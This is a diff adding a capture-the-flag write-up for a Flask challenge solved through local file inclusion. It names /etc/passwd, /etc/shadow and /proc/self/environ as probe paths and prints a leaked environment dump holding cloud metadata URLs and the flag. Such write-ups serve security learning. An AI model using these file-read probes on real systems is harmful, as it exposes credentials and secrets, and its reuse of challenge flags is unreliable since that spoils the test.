@@ -199,6 +199,30 @@ I then used burp suite repeater to add the cookie to a GET request for /secret a
 :+1: FLAG{th3_publ1c_k3y_was_the_priv4te_key}
 <hr>
 
+### PythonFlaskDefender
+Description - I wrote my own blog framework! I just learned python flask recently, it's super easy to get started.
+
+But apparently some kiddies thought it would be funny to hack my website and leak my files...
+
+So I've had to implement some self-defense measures. Take that, skids!
+
+URL port: 5000
+
+Flag format: FLAG{you_have_found_the_flag}
+
+Solution:
+Heading to the URL, and testing for LFI, you can check for things such as /etc/passwd and /etc/shadow
+
+I happened to try /proc/self/environ and got this
+```
+/proc/self/environ
+HOSTNAME=ip-172-31-24-42.ap-southeast-2.compute.internalFLASK_RUN_APP=appPYTHON_PIP_VERSION=22.0.4SHLVL=2HOME=/rootGPG_KEY=E3FF2839C048B25C084DEBE9B26995E310250568AWS_EXECUTION_ENV=AWS_ECS_FARGATEECS_AGENT_URI=http://169.254.170.2/api/d26781c5276b4b8ebceaa40e94539429-792494206AWS_DEFAULT_REGION=ap-southeast-2PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/5eaac1050023df1f5c98b173b248c260023f2278/public/get-pip.pyECS_CONTAINER_METADATA_URI_V4=http://169.254.170.2/v4/d26781c5276b4b8ebceaa40e94539429-792494206ECS_CONTAINER_METADATA_URI=http://169.254.170.2/v3/d26781c5276b4b8ebceaa40e94539429-792494206FLASK_RUN_HOST=0.0.0.0PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binLANG=C.UTF-8PYTHON_VERSION=3.9.14PYTHON_SETUPTOOLS_VERSION=58.1.0AWS_REGION=ap-southeast-2PWD=/PYTHON_GET_PIP_SHA256=5aefe6ade911d997af080b315ebcb7f882212d070465df544e1175ac2be519b4FLAG=FLAG{some_files_are_not_files}
+```
+Low and behold, the flag was sitting at the end
+
+:+1: FLAG{some_files_are_not_files}
+<hr>
+
 ### RedditSleuth
 Description - Redditective We believe that this redditor leaked confidential information to our rivals and we need
 you to take a look. Could you see if there is any leads from his account? u/ChaoticLlama12345 Flag format:
